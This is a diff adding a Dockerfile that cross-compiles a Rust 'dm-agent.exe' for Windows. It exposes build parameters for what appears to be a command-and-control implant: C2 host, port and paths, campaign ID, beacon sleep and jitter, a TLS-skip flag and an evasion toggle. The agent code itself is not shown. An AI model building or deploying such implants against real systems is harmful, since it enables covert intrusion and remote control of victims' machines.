@@ -1,0 +1,35 @@
+FROM rust:1.86-alpine AS builder
+
+RUN apk add --no-cache mingw-w64-gcc musl-dev
+
+RUN rustup target add x86_64-pc-windows-gnu
+
+WORKDIR /build
+COPY agent/ .
+
+ARG DM_C2_HOST=127.0.0.1
+ARG DM_C2_PORT=4443
+ARG DM_C2_PATH_POLL=/c
+ARG DM_C2_PATH_REG=/r
+ARG DM_CAMPAIGN_ID=00000000-0000-0000-0000-000000000000
+ARG DM_BUILD_UUID=00000000-0000-0000-0000-000000000000
+ARG DM_SLEEP_SECS=30
+ARG DM_JITTER_PCT=20
+ARG DM_TLS_SKIP_VERIFY=false
+ARG DM_NO_EVASION=false
+
+ENV DM_C2_HOST=$DM_C2_HOST \
+    DM_C2_PORT=$DM_C2_PORT \
+    DM_C2_PATH_POLL=$DM_C2_PATH_POLL \
+    DM_C2_PATH_REG=$DM_C2_PATH_REG \
+    DM_CAMPAIGN_ID=$DM_CAMPAIGN_ID \
+    DM_BUILD_UUID=$DM_BUILD_UUID \
+    DM_SLEEP_SECS=$DM_SLEEP_SECS \
+    DM_JITTER_PCT=$DM_JITTER_PCT \
+    DM_TLS_SKIP_VERIFY=$DM_TLS_SKIP_VERIFY \
+    DM_NO_EVASION=$DM_NO_EVASION
+
+RUN cargo build --release --target x86_64-pc-windows-gnu
+
+FROM alpine:3.20
+COPY --from=builder /build/target/x86_64-pc-windows-gnu/release/dm-agent.exe /dm-agent.exe
